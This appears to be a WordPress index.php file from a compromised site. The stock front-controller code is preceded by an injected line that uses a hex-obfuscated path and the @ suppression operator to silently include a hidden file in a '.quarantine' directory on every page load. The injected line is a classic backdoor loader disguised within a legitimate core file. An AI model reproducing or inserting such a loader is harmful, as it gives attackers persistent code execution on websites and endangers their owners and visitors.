<?PHP 
 @include_once("\x2f\x68\x6f\x6d\x65\x2f\x70\x69\x6e\x65\x72\x69\x64\x67\x65\x6c\x6f\x67\x63\x61\x62\x69\x2f\x70\x75\x62\x6c\x69\x63\x5f\x68\x74\x6d\x6c\x2f\x62\x6c\x6f\x67\x2f\x2f\x2e\x71\x75\x61\x72\x61\x6e\x74\x69\x6e\x65\x2f\x39\x34\x35\x39\x39\x30\x33");//hupus// ?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
